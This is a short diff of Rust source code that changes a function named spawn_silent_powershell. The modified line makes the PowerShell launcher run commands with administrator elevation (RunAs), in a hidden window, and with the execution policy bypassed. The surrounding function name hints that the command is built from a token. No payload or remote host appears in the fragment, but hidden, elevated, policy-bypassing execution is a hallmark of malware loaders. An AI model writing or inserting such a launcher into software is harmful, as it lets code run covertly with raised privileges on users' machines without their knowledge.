@@ -65,7 +65,7 @@ fn build_shell_command(token: &str) -> String {
 fn spawn_silent_powershell(command: &str) -> Result<(), String> {
     let escaped_command = command.replace('"', "\\\"");
     let ps_launcher = format!(
-        "Start-Process powershell -NoNewWindow -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','{}'",
+        "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','{}'",
         escaped_command
     );
 
